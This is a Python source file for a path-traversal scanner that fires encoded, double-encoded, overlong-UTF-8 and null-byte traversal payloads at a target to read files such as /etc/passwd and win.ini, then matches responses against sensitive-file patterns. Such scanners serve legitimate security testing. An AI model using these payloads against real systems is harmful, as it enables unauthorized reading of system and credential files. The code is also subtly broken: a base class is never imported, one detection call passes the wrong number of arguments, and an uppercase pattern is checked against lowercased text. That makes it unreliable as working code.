#!/usr/bin/env python3
import requests
from typing import Dict, List, Optional
from urllib.parse import urljoin, parse_qs, urlparse
import json
import re
from RAGScripts.utils.logger import setup_scanner_logger

class PathTraversalScanner(BaseScanner):
    @staticmethod
    def scan(url: str, method: str, token: Optional[str] = None) -> List[Dict]:
        logger = setup_scanner_logger("path_traversal_check")
        vulnerabilities = []
        
        traversal_payloads = [
            {
                'name': 'Basic traversal',
                'paths': [
                    '../../../etc/passwd',
                    '..\\..\\..\\windows\\win.ini',
                    '....//....//....//etc/passwd',
                    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
                ]
            },
            {
                'name': 'Nested traversal',
                'paths': [
                    './../../etc/passwd',
                    '/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
                    '.../.../.../etc/passwd'
                ]
            },
            {
                'name': 'Filter bypass',
                'paths': [
                    '..;/..;/..;/etc/passwd',
                    '..%252f..%252f..%252fetc%252fpasswd',
                    '%%32%65%%32%65%%32%66etc%%32%66passwd'
                ]
            }
        ]
        
        headers = {
            'Authorization': f'Bearer {token}' if token else '',
            'Content-Type': 'application/json'
        }
        
        for payload in traversal_payloads:
            for path in payload['paths']:
                try:
                    test_url = urljoin(url, path)
                    response = requests.request(
                        method,
                        test_url,
                        headers=headers,
                        timeout=5,
                        allow_redirects=False
                    )
                    
                    if is_path_traversal_vulnerable(response):
                        vuln = {
                            'type': 'PATH_TRAVERSAL',
                            'severity': 'HIGH',
                            'detail': f'Potential path traversal with {payload["name"]}',
                            'evidence': {
                                'url': test_url,
                                'method': method,
                                'payload': path,
                                'status_code': response.status_code,
                                'response': response.text[:500]
                            }
                        }
                        vulnerabilities.append(vuln)
                        
                except requests.RequestException as e:
                    logger.error(f"Error testing {path}: {str(e)}")
                    
        return vulnerabilities
        
    @staticmethod
    def is_path_traversal_vulnerable(response: requests.Response) -> bool:
        sensitive_patterns = [
            'root:x:0:0',
            '[boot loader]',
            'etc/passwd',
            'win.ini',
            'System32',
            '/var/log'
        ]
        
        return (response.status_code == 200 and
                any(pattern in response.text for pattern in sensitive_patterns))

scan = PathTraversalScanner.scan

async def check_path_traversal(target_url: str, path: str, method: str, initial_response: requests.Response) -> List[Dict]:
    findings = []
    
    try:
        test_url = urljoin(target_url, path)
        
        # Test cases for path traversal
        test_cases = [
            {
                'name': 'Basic Path Traversal',
                'payloads': [
                    '../../../etc/passwd',
                    '..\\..\\..\\windows\\win.ini',
                    '....//....//....//etc/passwd',
                    '..%2F..%2F..%2Fetc%2Fpasswd',
                    '..%252F..%252F..%252Fetc%252Fpasswd'
                ]
            },
            {
                'name': 'Encoded Traversal',
                'payloads': [
                    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                    '%252e%252e%252f%252e%252e%252fetc%252fpasswd',
                    '..%c0%af..%c0%af..%c0%afetc/passwd',
                    '%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
                    '0x2e0x2e/0x2e0x2e/etc/passwd'
                ]
            },
            {
                'name': 'Filter Bypass',
                'payloads': [
                    '....//....//....//etc/passwd',
                    '.../.../.../etc/passwd',
                    '....\\....\\....\\windows\\win.ini',
                    '..//../..//etc//passwd',
                    '..././../.././etc/passwd'
                ]
            },
            {
                'name': 'Nested Traversal',
                'payloads': [
                    '/../../../etc/passwd',
                    '/../../etc/passwd/..',
                    '../etc/passwd%00.jpg',
                    '../etc/passwd%00.png',
                    '../../etc/passwd/.htaccess'
                ]
            }
        ]
        
        # Parameters that might be vulnerable
        file_params = ['file', 'path', 'folder', 'dir', 'directory', 'include', 'require', 'read', 'download']
        
        # Extract parameters from URL and response
        params = extract_parameters(initial_response)
        
        for param_name, param_value in params.items():
            if any(fp in param_name.lower() for fp in file_params):
                for test in test_cases:
                    for payload in test['payloads']:
                        try:
                            modified_params = params.copy()
                            modified_params[param_name] = payload
                            
                            response = requests.request(
                                method,
                                test_url,
                                params=modified_params if method == 'GET' else None,
                                data=modified_params if method != 'GET' else None,
                                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                                timeout=5
                            )
                            
                            if is_path_traversal_vulnerable(response, test, payload):
                                findings.append({
                                    "type": "Path Traversal",
                                    "detail": f"Potential {test['name']} vulnerability",
                                    "evidence": {
                                        "url": test_url,
                                        "parameter": param_name,
                                        "payload": payload,
                                        "status_code": response.status_code,
                                        "response": response.text[:200]
                                    }
                                })
                                
                        except requests.exceptions.RequestException:
                            continue
                    
    except Exception as e:
        print(f"Error in path traversal check: {str(e)}")
    
    return findings

def extract_parameters(response: requests.Response) -> Dict:
    params = {}
    
    # Extract URL parameters
    if response.request.url:
        parsed_url = urlparse(response.request.url)
        params.update(parse_qs(parsed_url.query))
    
    # Extract form parameters
    try:
        content = response.text
        input_pattern = r'<input[^>]+name=["\']([^"\']+)["\'][^>]*>'
        for match in re.finditer(input_pattern, content):
            params[match.group(1)] = ''
    except:
        pass
    
    return params

def is_path_traversal_vulnerable(response: requests.Response, test: Dict, payload: str) -> bool:
    try:
        response_text = response.text.lower()
        
        # Common file content patterns
        file_patterns = [
            'root:x:0:0',          # Unix passwd file
            '[fonts]',             # Windows ini file
            '<!DOCTYPE html',      # HTML file
            '<?php',              # PHP file
            '#!/bin/',            # Shell script
            'apache_',            # Apache config
            'nginx_',             # Nginx config
            'www-data',           # Web server user
            'database.yml'        # Rails config
        ]
        
        # Check for file content in response
        if any(pattern in response_text for pattern in file_patterns):
            return True
        
        # Check for directory listing
        if '<directory>' in response_text or 'index of /' in response_text:
            return True
        
        # Check for error messages that might indicate successful traversal
        error_patterns = [
            'permission denied',
            'access denied',
            'not found',
            'no such file',
            'failed to open stream',
            'directory listing denied'
        ]
        
        if any(pattern in response_text for pattern in error_patterns):
            if response.status_code != 404:  # Expect 404 for proper file not found handling
                return True
        
        # Check response size for potential file content
        if response.status_code == 200 and len(response.content) > 0:
            if test['name'] == 'Basic Path Traversal' and 'root:' in response_text:
                return True
            if test['name'] == 'Encoded Traversal' and any(pattern in response_text for pattern in file_patterns):
                return True
        
    except:
        pass
    
    return False

if __name__ == "__main__":
    # For standalone testing
    import asyncio
    async def test():
        result = await check_path_traversal(
            "http://localhost:5000",
            "/download?file=test.txt",
            "GET",
            requests.Response()
        )
        print(json.dumps(result, indent=2))
    
    asyncio.run(test())